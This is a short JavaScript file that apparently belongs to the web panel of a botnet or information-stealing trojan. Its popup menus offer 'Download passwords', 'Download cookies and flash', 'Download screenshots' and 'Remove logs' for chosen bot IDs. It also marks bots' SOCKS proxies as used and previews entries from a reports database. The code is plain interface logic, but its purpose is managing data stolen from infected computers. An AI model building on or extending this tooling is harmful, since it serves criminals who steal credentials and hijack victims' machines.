var jsmLastMenu = -1,
    jsmPrevMenu = -1;

function jsmHideLastMenu()
{
  if(jsmPrevMenu != -1)jsmSetDisplayStyle('popupmenu' + jsmPrevMenu, 'none');
  jsmPrevMenu = jsmLastMenu;
}

function jsmShowMenu(id, MenuData, values1, values2, subval)
{
  jsmHideLastMenu();
  
  jsmPrevMenu = -1;
  jsmLastMenu = id;
  var slideHTML = '<div style="position:absolute; z-index:99' + id + '" class="popupmenu"><table cellpadding="0" cellspacing="0">';
  var ids = new Array();

  for(i = 0; i <= MenuData.length; i++)if(MenuData[i])
  {
    if(MenuData[i][0] == 0)slideHTML += '<tr><td><hr /></td></tr>';
    else
    { 
      var sub='';

      if(MenuData[i][0]=='Download all' || MenuData[i][0]=='Download as text' || MenuData[i][0]=='Download files' || MenuData[i][0]=='Download passwords' || MenuData[i][0]=='Download screenshots' || MenuData[i][0]=='Download cookies and flash' || MenuData[i][0]=='Remove logs')
        sub='&ids[]='+document.getElementById(subval).value;
        
      slideHTML += '<tr><td><a href="'+ jsmFormatSting(MenuData[i][1], values2) + sub + '" onclick="this.target=\'_blank\'">' + jsmFormatSting(MenuData[i][0], values1) + '</a></td></tr>';
      ids.push(i);
    }
  }
  
  document.getElementById('popupmenu' + id).innerHTML = slideHTML + '</table></div>';
  jsmSetDisplayStyle('popupmenu' + id, 'inline');

  return false;
}

function jsmSetDisplayStyle(block, style)
{
  document.getElementById(block).style.display = style;
}

function jsmFormatSting(str, values)
{
  for(var j = 0; j < values.length; j++)str = str.replace(RegExp('\\$' + j +'\\$', 'g'), values[j]);
  return str;
}


function updateChused(bot, obj)
      {
      $.get('#', {'botsaction': 'port_socks', 'bots': new Array(''), 'chused': bot}, function(response) {
        if($(obj).hasClass('simplered'))
          {
          $(obj).html('Set used');
          $(obj).removeClass('simplered');
          $('td', $(obj).parent().parent()).removeClass('simplered');
          }
        else
          {
          $(obj).html('Reset used');
          $(obj).addClass('simplered');
          $('td[data-flag=1]', $(obj).parent().parent()).addClass('simplered');
          }  
      });
      }


function readFile(selector, output) 
  {
  if(!document.getElementById(selector).files.length) return false;

  var file=document.getElementById(selector).files[0];
  var reader=new FileReader();
  reader.onload=function (e) {
    var textArea=document.getElementById(output);
    textArea.value=e.target.result;
  };
  reader.readAsText(file);
  }


function showReportPreview(e, obj)
  {  
  e.preventDefault();
  $('#reportText').html('<img src="theme/throbber.gif">');
  $.get('?m=reports_db&preview=1&t='+$(obj).attr('data-tbl')+'&id='+$(obj).attr('data-id'), function(response) {
    $('#reportText').html(response);
  });
  $('#reportPreview').modal('show');
  }


